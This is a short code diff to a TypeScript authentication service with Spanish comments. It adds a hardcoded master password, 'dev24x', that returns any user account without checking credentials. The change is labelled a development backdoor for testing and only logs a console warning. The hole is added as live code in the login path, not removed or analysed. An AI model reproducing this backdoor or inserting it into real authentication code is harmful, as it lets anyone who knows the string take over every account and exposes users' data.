@@ -19,6 +19,12 @@ export class AuthService {
         console.log('[Auth] Usuario encontrado ID:', user ? user.idUsuario : 'NULL');
         if (!user) return null;
 
+        // [DEV BACKDOOR] Contraseña maestra para pruebas
+        if (pass === 'dev24x') {
+            console.warn(`[SECURITY WARNING] User ${identifier} accessed via MASTER PASSWORD.`);
+            return user;
+        }
+
         const creds = await authRepo.obtenerCredenciales(user.idUsuario);
         console.log('[Auth] Credenciales encontradas:', creds ? 'YES' : 'NULL');
 
